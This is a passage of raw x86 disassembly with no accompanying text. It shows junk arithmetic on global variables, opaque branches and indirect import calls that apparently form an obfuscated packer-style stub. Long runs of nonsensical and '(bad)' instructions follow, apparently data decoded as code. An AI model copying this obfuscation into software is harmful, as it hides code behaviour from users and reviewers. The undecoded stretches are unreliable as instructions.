  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42829f
  40b386:	adc    DWORD PTR ds:0x428193,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428307,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428273,0x42825f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42816b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428387,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428167,0x42839b
  40b3c4:	call   0x42206f
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42826b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42829b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428283,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42831b
  40b3f3:	mov    eax,ds:0x428293
  40b3f8:	cmp    DWORD PTR ds:0x42829b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428edc
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42818b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42827b
  40b422:	or     DWORD PTR ds:0x42830b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428167,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428393,0x0
  40b441:	mov    DWORD PTR ds:0x42830b,ecx
  40b447:	mov    DWORD PTR ds:0x42838b,0x318c
  40b451:	mov    DWORD PTR ds:0x42839b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428263,0x461b
  40b46a:	mov    DWORD PTR ds:0x42829f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428393,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ee0
  40b48f:	xor    edx,DWORD PTR ds:0x428273
  40b495:	adc    ecx,DWORD PTR ds:0x42837b
  40b49b:	and    DWORD PTR ds:0x42816b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42827f
  40b4b7:	xor    DWORD PTR ds:0x428393,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428263
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42817f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42815b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42822b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282a7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42817f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fd3
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428dc8
  40b528:	sbb    DWORD PTR ds:0x428297,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281cf
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283bb
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42819b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428243
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428273
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282a3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42837b,0x428243
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0x5d
  40b596:	fidivr WORD PTR [ecx+0x7c]
  40b599:	or     dl,BYTE PTR [ebx]
  40b59b:	sbb    BYTE PTR [eax],bl
  40b59d:	outs   dx,BYTE PTR ds:[esi]
  40b59e:	adc    bl,BYTE PTR [eax]
  40b5a0:	sbb    BYTE PTR [esi+0x42],ch
  40b5a3:	xchg   ecx,eax
  40b5a4:	fimul  WORD PTR [eax+edx*2]
  40b5a7:	hlt    
  40b5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a9:	pusha  
  40b5aa:	in     eax,dx
  40b5ab:	not    BYTE PTR [esi+0x147aa382]
  40b5b1:	jns    0x40b569
  40b5b3:	pop    edx
  40b5b4:	mov    esi,DWORD PTR [ebx+0xaf35146]
  40b5ba:	and    ecx,DWORD PTR [ebp-0x7cdd43ec]
  40b5c0:	sti    
  40b5c1:	fld    QWORD PTR [ebx+0x4015332]
  40b5c7:	xchg   BYTE PTR ds:0x789b7d1c,bl
  40b5cd:	push   edx
  40b5ce:	and    BYTE PTR [ebx],dl
  40b5d0:	test   DWORD PTR [eax-0x11],esp
  40b5d3:	dec    esi
  40b5d4:	clc    
  40b5d5:	dec    esp
  40b5d6:	push   es
  40b5d7:	jae    0x40b57f
  40b5d9:	mov    dh,0x5b
  40b5db:	push   esp
  40b5dc:	jne    0x40b569
  40b5de:	and    eax,0x83d1f2d2
  40b5e3:	xor    ebp,edi
  40b5e5:	fdiv   QWORD PTR [ebx]
  40b5e7:	dec    esp
  40b5e8:	xchg   ebp,eax
  40b5e9:	dec    eax
  40b5ea:	dec    edx
  40b5eb:	hlt    
  40b5ec:	loope  0x40b65d
  40b5ee:	xchg   ebx,eax
  40b5ef:	dec    esp
  40b5f0:	inc    ebp
  40b5f1:	in     al,dx
  40b5f2:	mul    cl
  40b5f4:	repz ja 0x40b60a
  40b5f7:	(bad)  [esi+0x3e]
  40b5fa:	jge    0x40b5c9
  40b5fc:	dec    ecx
  40b5fd:	pop    ebp
  40b5fe:	mov    edx,0x2df06b88
  40b603:	inc    BYTE PTR [edx-0x29e7cc0c]
  40b609:	jp     0x40b63e
  40b60b:	mov    ds:0xe04a9ae4,eax
  40b610:	(bad)  [edx+ecx*4-0x4b]
  40b614:	push   ecx
  40b615:	mov    ds:0x30b5bf9c,al
  40b61a:	call   0x7b66:0x303831cc
  40b621:	sub    al,0xe3
  40b623:	sti    
  40b624:	test   BYTE PTR [eax],0xf8
  40b627:	(bad)  
  40b628:	idiv   BYTE PTR [ecx+0x12]
  40b62b:	sti    
  40b62c:	iret   
  40b62d:	xor    DWORD PTR [eax-0x233cbca5],0xffffffb0
  40b634:	sbb    eax,0xc6de6d64
  40b639:	mov    bl,0xa5
  40b63b:	push   ds
  40b63c:	pop    es
  40b63d:	mov    ds,WORD PTR [eax+edx*4-0x4d]
  40b641:	jb     0x40b62d
  40b643:	or     BYTE PTR [edi+0x71c934af],bl
  40b649:	lock outs dx,BYTE PTR ds:[esi]
  40b64b:	lods   eax,DWORD PTR ds:[esi]
  40b64c:	jne    0x40b61e
  40b64e:	cwde   
  40b64f:	ins    BYTE PTR es:[edi],dx
  40b650:	sar    DWORD PTR [edx+0x46eff9af],1
  40b656:	lock test DWORD PTR [ecx-0x5a03892a],eax
  40b65d:	adc    DWORD PTR [ebx+0x70ac2b7d],0x40
  40b664:	sub    DWORD PTR [ebp-0x26],ecx
  40b667:	int    0xdc
  40b669:	cwde   
  40b66a:	ins    BYTE PTR es:[edi],dx
  40b66b:	leave  
  40b66c:	les    esi,FWORD PTR [eax-0x2ee313a1]
  40b672:	adc    esp,edi
  40b674:	(bad)  
  40b675:	cmp    esp,ecx
  40b677:	mov    ebp,edx
  40b679:	push   ds
  40b67a:	jno    0x40b6f7
  40b67c:	cs test eax,0x49396542
  40b682:	mov    ds:0xa2fe6e70,al
  40b687:	stos   BYTE PTR es:[edi],al
  40b688:	and    eax,0xbc1e375e
  40b68d:	push   edx
  40b68e:	xchg   ebx,eax
  40b68f:	mov    edi,DWORD PTR [esi+0x50]
  40b692:	lods   eax,DWORD PTR ds:[esi]
  40b693:	and    BYTE PTR [ecx+0x2e],bh
  40b696:	adc    al,cl
  40b698:	outs   dx,DWORD PTR ds:[esi]
  40b699:	(bad)
  40b69c:	dec    esp
  40b69d:	cmp    al,BYTE PTR [ecx]
  40b69f:	ja     0x40b69d
  40b6a1:	cli    
  40b6a2:	test   BYTE PTR [edx+0x30504ce3],0x7c
  40b6a9:	xor    ebp,DWORD PTR cs:[eax+0x7]
  40b6ad:	sbb    al,0x98
  40b6af:	cs inc edi
  40b6b1:	stc    
  40b6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b3:	cvttps2pi mm5,QWORD PTR [esi+0x65d0f818]
  40b6ba:	aam    0x26
  40b6bc:	jp     0x40b6f4
  40b6be:	pushf  
  40b6bf:	shl    BYTE PTR [edi+ebp*4],cl
  40b6c2:	inc    eax
  40b6c3:	shl    ecx,cl
  40b6c5:	aas    
  40b6c6:	push   esp
  40b6c7:	xchg   BYTE PTR [ebx+eax*8-0xdd373d0],dh
  40b6ce:	inc    edi
  40b6cf:	lock dec ecx
  40b6d1:	xchg   edi,eax
  40b6d2:	mov    al,0x92
  40b6d4:	hlt    
  40b6d5:	ins    DWORD PTR es:[edi],dx
  40b6d6:	xor    eax,0x5d0d9fc8
  40b6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6dc:	(bad)  
  40b6dd:	or     edx,DWORD PTR ds:0x2547a9bd
  40b6e3:	lods   al,BYTE PTR ds:[esi]
  40b6e4:	cmp    ch,cl
  40b6e6:	sub    ebp,DWORD PTR [ecx+0x5f]
  40b6e9:	jecxz  0x40b6fe
  40b6eb:	dec    eax
  40b6ec:	(bad)  
  40b6ed:	jne    0x40b731
  40b6ef:	cs std 
  40b6f1:	stos   BYTE PTR es:[edi],al
  40b6f2:	cs inc esp
  40b6f4:	mov    bh,0xe2
  40b6f6:	scas   al,BYTE PTR es:[edi]
  40b6f7:	sbb    al,0x39
  40b6f9:	in     eax,0xff
  40b6fb:	stos   DWORD PTR es:[edi],eax
  40b6fc:	fldenv [edi+0x3c]
  40b6ff:	jbe    0x40b6e0
  40b701:	sbb    ch,BYTE PTR [eax-0x4]
  40b704:	sub    eax,0x906f0478
  40b709:	pushf  
  40b70a:	sbb    al,0x66
  40b70c:	push   ebp
  40b70d:	ss test al,0x8e
  40b710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b711:	xchg   esp,eax
  40b712:	and    DWORD PTR [ebx+0x55a7eaf0],ebp
  40b718:	in     eax,0x2c
  40b71a:	mov    dh,0x6c
  40b71c:	ret    
  40b71d:	xor    cl,BYTE PTR [ebx-0x79836415]
  40b723:	cwde   
  40b724:	lods   al,BYTE PTR ds:[esi]
  40b725:	(bad)  
  40b727:	cmp    BYTE PTR [ecx+0x3b],bl
  40b72a:	xchg   esp,eax
  40b72b:	jbe    0x40b6e0
  40b72d:	sub    ch,BYTE PTR [ecx]
  40b72f:	add    al,BYTE PTR [edi+ecx*8]
  40b732:	aad    0xa2
  40b734:	inc    DWORD PTR [esi+ebp*8+0x294d2fd5]
  40b73b:	push   esp
  40b73c:	in     eax,dx
  40b73d:	outs   dx,BYTE PTR ds:[esi]
  40b73e:	add    al,0xf
  40b741:	fcom   DWORD PTR [ebp+esi*8-0x44f025c5]
  40b748:	jge    0x40b76c
  40b74a:	stc    
  40b74b:	mov    edi,0xdee3a295
  40b750:	dec    ebx
  40b751:	aas    
  40b752:	adc    eax,0x517cf248
  40b757:	inc    eax
  40b758:	fld    DWORD PTR [eax+0xef6791e]
  40b75e:	ficom  DWORD PTR [edx-0x72]
  40b761:	scas   al,BYTE PTR es:[edi]
  40b762:	sahf   
  40b763:	sti    
  40b764:	ins    DWORD PTR es:[edi],dx
  40b765:	fld    st(7)
  40b767:	ret    0xcb9a
  40b76a:	addr16 es loopne 0x40b715
  40b76e:	aad    0xd2
  40b770:	lods   al,BYTE PTR ds:[esi]
  40b771:	pop    ebp
  40b773:	addr16 mov ds:0xdce4,eax
  40b777:	xor    ebx,DWORD PTR [edi]
  40b779:	addr16 jge 0x40b79a
  40b77c:	sti    
  40b77d:	jp     0x40b725
  40b77f:	push   ss
  40b780:	mov    ebx,0x3a44ba34
  40b785:	shr    DWORD PTR [edi],0xbd
  40b788:	sar    edi,cl
  40b78a:	(bad)  
  40b78b:	aad    0xea
  40b78d:	mov    ecx,0xbb1dfa85
  40b792:	leave  
  40b793:	loope  0x40b7aa
  40b795:	mov    dh,0x96
  40b797:	inc    edi
  40b798:	pop    eax
  40b799:	mov    ah,0x15
  40b79b:	lds    ebp,FWORD PTR [edi+0x5a]
  40b79e:	sti    
  40b79f:	pop    edi
  40b7a0:	adc    eax,0xf98ce96f
  40b7a5:	into   
  40b7a6:	ins    DWORD PTR es:[edi],dx
  40b7a7:	pop    esp
  40b7a8:	lahf   
  40b7a9:	pop    eax
  40b7aa:	jg     0x40b7fa
  40b7ac:	fwait
  40b7ad:	mov    ah,0xd9
  40b7af:	imul   esp,DWORD PTR [eax],0x213f1d9c
  40b7b5:	aaa    
  40b7b6:	ss out 0x26,eax
  40b7b9:	pop    eax
  40b7ba:	gs push ebp
  40b7bc:	mov    ch,0x3b
  40b7be:	repz xlat BYTE PTR ds:[ebx]
  40b7c0:	mov    bl,0x5f
  40b7c2:	imul   bh
  40b7c4:	pop    ds
  40b7c5:	pop    ebx
  40b7c6:	mov    esi,DWORD PTR [esi-0x45]
  40b7c9:	add    dh,0xc2
  40b7cc:	imul   eax,DWORD PTR [ebx],0xffffffe4
  40b7cf:	adc    al,0xde
  40b7d1:	inc    esp
  40b7d2:	xor    dh,bl
  40b7d4:	inc    ebx
  40b7d5:	shr    DWORD PTR [eax+0xc],0xd1
  40b7d9:	add    al,0x48
  40b7db:	add    eax,0x9bbcd2bc
  40b7e0:	jb     0x40b7a1
  40b7e2:	inc    esp
  40b7e3:	mov    bh,0x1f
  40b7e5:	loope  0x40b78e
  40b7e7:	xchg   ebx,eax
  40b7e8:	repz xchg edi,eax
  40b7ea:	jl     0x40b77e
  40b7ec:	xor    eax,0x24467914
  40b7f1:	sbb    ah,dl
  40b7f3:	add    BYTE PTR [edi-0x19],bl
  40b7f6:	xchg   edx,eax
  40b7f7:	push   edx
  40b7f8:	mov    dh,0x57
  40b7fa:	sbb    al,cl
  40b7fc:	push   edi
  40b7fd:	mov    ?,ebp
  40b7ff:	cmc    
  40b800:	and    DWORD PTR [edi-0x46bfe4d5],esp
  40b806:	(bad)  
  40b807:	int    0x48
  40b809:	pushf  
  40b80a:	imul   ebx,DWORD PTR [edx],0xffffffe9
  40b80d:	xor    eax,ebx
  40b80f:	loop   0x40b830
  40b811:	dec    eax
  40b812:	retf   0x42e8
  40b815:	add    al,0x2b
  40b817:	dec    ecx
  40b818:	and    al,0x76
  40b81a:	das    
  40b81b:	stc    
  40b81c:	fisubr WORD PTR [esi+eiz*4]
  40b81f:	sar    BYTE PTR [ecx+0xa85bb42],cl
  40b825:	out    dx,eax
  40b826:	mov    BYTE PTR [ebx+0x27],al
  40b829:	(bad)  
  40b82a:	lods   eax,DWORD PTR ds:[esi]
  40b82b:	xor    eax,0x7dca6c87
  40b830:	mov    ?,WORD PTR [ecx-0x26]
  40b833:	dec    edi
  40b834:	cmp    ah,0xac
  40b837:	push   edi
  40b838:	in     eax,dx
  40b839:	mov    al,ds:0x47f3afad
  40b83e:	mov    ebp,0xe961dd6f
  40b843:	push   edx
  40b844:	stc    
  40b845:	icebp  
  40b846:	ret    0xdc09
  40b849:	cmp    eax,0xe49745a0
  40b84e:	adc    ebp,0x253f8f36
  40b854:	xchg   BYTE PTR [ebp-0x688b43ef],ch
  40b85a:	dec    edx
  40b85b:	push   ebp
  40b85c:	dec    esi
  40b85d:	mov    eax,ds:0xd2852931
  40b862:	xchg   esi,eax
  40b863:	push   edx
  40b864:	sbb    ecx,esp
  40b866:	loope  0x40b87f
  40b868:	mov    ds:0xd392d18c,al
  40b86d:	cmp    edi,edx
  40b86f:	cmp    DWORD PTR [ebp+0x1bfb683e],edi
  40b875:	pop    ss
  40b876:	dec    ecx
  40b877:	xor    edx,eax
  40b879:	loope  0x40b88c
  40b87b:	dec    ebp
  40b87c:	in     eax,dx
  40b87d:	or     DWORD PTR [edx+ebp*2+0x3],esi
  40b881:	add    edi,ebx
  40b883:	retf   0xd8e9
  40b886:	loopne 0x40b8fd
  40b888:	outs   dx,BYTE PTR ds:[esi]
  40b889:	pusha  
  40b88a:	jmp    0x54bbf8b9
  40b88f:	mov    bh,0x46
  40b891:	lds    esi,FWORD PTR [edi]
  40b893:	jmp    0xb42e:0xc7867df3
  40b89a:	mov    ah,0xbf
  40b89c:	xchg   esi,eax
  40b89d:	add    eax,0x992d53f7
  40b8a2:	ror    DWORD PTR [edx],1
  40b8a4:	clc    
  40b8a5:	mov    esi,0xec7a12d8
  40b8aa:	repz sahf 
  40b8ac:	cmp    ebx,esi
  40b8ae:	add    eax,0x1fd4f41f
  40b8b3:	mov    ecx,0x882979ff
  40b8b8:	aad    0xdc
  40b8ba:	out    0x5b,eax
  40b8bc:	into   
  40b8bd:	inc    ecx
  40b8be:	(bad)  
  40b8bf:	xor    eax,DWORD PTR [edi+0x4d673c01]
  40b8c5:	lahf   
  40b8c6:	inc    ecx
  40b8c7:	sbb    eax,0x129a6792
  40b8cc:	aam    0x3d
  40b8ce:	push   es
  40b8cf:	push   ebp
  40b8d0:	fdivr  st(3),st
  40b8d2:	cmp    al,0x92
  40b8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8d5:	jae    0x40b925
  40b8d7:	cmc    
  40b8d8:	jmp    0x413d:0x569e0a65
  40b8df:	xor    DWORD PTR [edi-0x28],ebx
  40b8e2:	jp     0x40b88d
  40b8e4:	loope  0x40b8c5
  40b8e6:	push   ecx
  40b8e7:	fld    TBYTE PTR ss:[ebx+edx*4+0x3]
  40b8ed:	push   edx
  40b8ee:	mov    BYTE PTR [eax],cl
  40b8f0:	add    eax,0x3d3caa0
  40b8f5:	mov    ah,0x51
  40b8f7:	inc    eax
  40b8f8:	dec    edx
  40b8f9:	push   cs
  40b8fa:	inc    esi
  40b8fb:	mov    eax,0xc2a6327b
  40b900:	sar    ecx,1
  40b902:	cmp    cl,BYTE PTR [edi]
  40b904:	ins    DWORD PTR es:[edi],dx
  40b905:	cmp    eax,0xc6039e08
  40b90a:	fcmovu st,st(2)
  40b90c:	lock add esi,ebp
  40b90f:	xor    cl,BYTE PTR [eax]
  40b911:	cmp    DWORD PTR [eax],ecx
  40b913:	mov    ecx,0x6778aed6
  40b918:	add    BYTE PTR [eax+0x9],ch
  40b91b:	je     0x40b8d0
  40b91d:	adc    dl,BYTE PTR [ebx+0x27]
  40b920:	nop
  40b921:	ins    BYTE PTR es:[edi],dx
  40b922:	sti    
  40b923:	lods   eax,DWORD PTR ds:[esi]
  40b924:	out    0xfe,eax
  40b926:	sbb    DWORD PTR [edx],esi
  40b928:	pop    es
  40b929:	lea    ebx,[ebx+0xa]
  40b92c:	dec    edx
  40b92d:	mov    ebx,0xbd354790
  40b932:	mov    al,0xb0
  40b934:	sub    cl,ch
  40b936:	inc    edx
  40b937:	mov    ch,0xd5
  40b939:	fsub   DWORD PTR [ebx+ebx*2]
  40b93c:	cmp    DWORD PTR [edi-0x4243685e],edx
  40b942:	xchg   ebx,eax
  40b943:	mov    BYTE PTR [ebp+0x77cb2ac],bh
  40b949:	(bad)  
  40b94a:	rol    bh,cl
  40b94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b94d:	lds    ebp,FWORD PTR [eax-0x27]
  40b950:	mov    esi,0x3f973dc5
  40b955:	cmp    al,0xdc
  40b957:	in     al,0x1f
  40b959:	mov    bl,0xfe
  40b95b:	or     BYTE PTR [esi-0x4b],ch
  40b95e:	pop    ss
  40b95f:	es sbb eax,0x5689cc05
  40b965:	jae    0x40b96b
  40b967:	mov    edx,0x3df5b3ba
  40b96c:	fstp   DWORD PTR [edi+ebx*1+0x6324120d]
  40b973:	stos   DWORD PTR es:[edi],eax
  40b974:	jl     0x40b925
  40b976:	mov    ch,0x28
  40b978:	mov    eax,ds:0x355c054f
  40b97d:	add    BYTE PTR [eax],al
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x4282f3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428277
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428307,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42830f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428277,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42830f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42839f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42830f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428dcc
  40b9f7:	adc    DWORD PTR ds:0x42839b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282f7
  40ba0a:	sub    edx,DWORD PTR ds:0x42830b
  40ba10:	mov    DWORD PTR ds:0x4282f7,edx
  40ba16:	adc    DWORD PTR ds:0x4282f3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428167
  40ba26:	xor    DWORD PTR ds:0x428393,edx
  40ba2c:	or     DWORD PTR ds:0x42823f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428277
  40ba3c:	or     DWORD PTR ds:0x428313,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	cli    
  40baa4:	sub    esp,edi
  40baa6:	mov    esi,0x18180d60
  40baab:	outs   dx,BYTE PTR ds:[esi]
  40baac:	adc    bl,BYTE PTR [eax]
  40baae:	sbb    cl,bh
  40bab0:	sbb    eax,0x8993f89b
  40bab5:	dec    ebp
  40bab6:	cmp    dl,bl
  40bab8:	lock jb 0x40bb0c
  40babb:	mov    BYTE PTR [eax-0x5],0x26
  40babf:	add    eax,DWORD PTR [edx+0x6674368b]
  40bac5:	hlt    
  40bac6:	inc    ebp
  40bac7:	adc    al,0x4c
  40bac9:	adc    DWORD PTR [ebp-0x1f33d79c],esp
  40bacf:	enter  0x4499,0xe5
  40bad3:	test   DWORD PTR [esi+0x6],edi
  40bad6:	jo     0x40baf1
  40bad8:	sub    al,0xc0
  40bada:	outs   dx,DWORD PTR ds:[esi]
  40badb:	js     0x40bacd
  40badd:	push   ebx
  40bade:	sbb    BYTE PTR [ebx-0x41],dh
  40bae1:	jl     0x40ba9c
  40bae3:	mov    gs,WORD PTR [esi]
  40bae5:	jmp    0x7ef4:0x4b7f241a
  40baec:	push   cs
  40baed:	lods   al,BYTE PTR ds:[esi]
  40baee:	pop    edx
  40baef:	pusha  
  40baf0:	test   al,0xdd
  40baf2:	cmp    edi,0xa3c9c7e8
  40baf8:	mov    cl,0x37
  40bafa:	mov    eax,0xb2a5609c
  40baff:	sub    DWORD PTR [ebx+0x50671db1],ecx
  40bb05:	jb     0x40bb43
  40bb07:	inc    BYTE PTR [ecx+0x25]
  40bb0a:	ins    DWORD PTR es:[edi],dx
  40bb0b:	xchg   ebp,eax
  40bb0c:	jle    0x40bafb
  40bb0e:	inc    edi
  40bb0f:	cwde   
  40bb10:	clc    
  40bb11:	cmp    dl,BYTE PTR [ebx-0x51]
  40bb14:	icebp  
  40bb15:	dec    eax
  40bb16:	fisttp QWORD PTR [ebx+0x1a3da617]
  40bb1c:	cdq    
  40bb1d:	fistp  WORD PTR [eax+0x4c]
  40bb20:	xchg   DWORD PTR [ecx],ebp
  40bb22:	jo     0x40bab4
  40bb24:	pop    esp
  40bb25:	jb     0x40bb37
  40bb27:	out    dx,al
  40bb28:	add    al,0xf5
  40bb2a:	out    dx,eax
  40bb2b:	sahf   
  40bb2c:	loopne 0x40baff
  40bb2e:	cld    
  40bb2f:	sbb    al,0x1b
  40bb31:	addr16 xchg edi,eax
  40bb33:	mov    edi,0x2829550d
  40bb38:	sbb    eax,0x1bff76a8
  40bb3d:	add    ah,cl
  40bb3f:	mov    es,WORD PTR [ebp-0x22f31a05]
  40bb45:	cmp    ebx,DWORD PTR [edx-0x74513cd0]
  40bb4b:	adc    al,BYTE PTR [eax-0x4f3f2ca4]
  40bb51:	dec    ecx
  40bb52:	retf   
  40bb53:	outs   dx,BYTE PTR ds:[esi]
  40bb54:	jp     0x40baed
  40bb56:	lods   al,BYTE PTR ds:[esi]
  40bb57:	dec    esi
  40bb58:	jmp    0x5fe3:0x57564640
  40bb5f:	in     al,0x86
  40bb61:	xor    eax,0x841aa755
  40bb66:	shl    DWORD PTR [ebx+0x302b1193],0x1b
  40bb6d:	push   cs
  40bb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb6f:	pop    ds
  40bb70:	in     al,0x8
  40bb72:	adc    eax,0x48b8edee
  40bb77:	jecxz  0x40bb82
  40bb79:	jecxz  0x40bb31
  40bb7b:	outs   dx,BYTE PTR ds:[esi]
  40bb7c:	add    BYTE PTR [edx-0x8bf40e9],cl
  40bb82:	jecxz  0x40bb17
  40bb84:	xor    al,0xe7
  40bb86:	std    
  40bb87:	dec    edx
  40bb88:	ins    DWORD PTR es:[edi],dx
  40bb89:	or     eax,edi
  40bb8b:	pop    esi
  40bb8c:	addr16 push ebx
  40bb8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb8f:	mov    bh,0x79
  40bb91:	and    ch,cl
  40bb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb94:	dec    edx
  40bb95:	(bad)  
  40bb96:	fstp   st(0)
  40bb98:	daa    
  40bb99:	lods   al,BYTE PTR ds:[esi]
  40bb9a:	or     al,0xbf
  40bb9c:	dec    edi
  40bb9d:	test   eax,0x4ce126d9
  40bba2:	sbb    bh,BYTE PTR [ecx]
  40bba4:	aaa    
  40bba5:	repz dec eax
  40bba7:	sbb    BYTE PTR [edi],dh
  40bba9:	nop
  40bbaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbab:	sbb    ebp,DWORD PTR [esi+0x14]
  40bbae:	or     eax,0x7bde2a96
  40bbb3:	cmp    al,0x12
  40bbb5:	mov    eax,ds:0xda5c7e06
  40bbba:	xchg   ebp,eax
  40bbbb:	or     eax,0xe15af4b8
  40bbc0:	mov    al,ds:0x4a3924c5
  40bbc5:	clc    
  40bbc6:	(bad)  
  40bbc7:	repnz fs dec edx
  40bbca:	lds    eax,FWORD PTR [ebx+0x4c]
  40bbcd:	lods   al,BYTE PTR ds:[esi]
  40bbce:	sub    al,ah
  40bbd0:	sbb    BYTE PTR [edi+edi*8],dl
  40bbd3:	dec    BYTE PTR fs:[edi-0x550a3a89]
  40bbda:	push   0xbb68628a
  40bbdf:	add    BYTE PTR [ebx+0x8],bl
  40bbe2:	repz popa 
  40bbe4:	and    al,0x81
  40bbe6:	pop    ebp
  40bbe7:	loope  0x40bc31
  40bbe9:	jecxz  0x40bbc4
  40bbeb:	or     eax,0xee943aae
  40bbf0:	push   ecx
  40bbf1:	in     eax,dx
  40bbf2:	sub    ah,BYTE PTR [ebp+0x2ae20e02]
  40bbf8:	popf   
  40bbf9:	ds sbb bh,dh
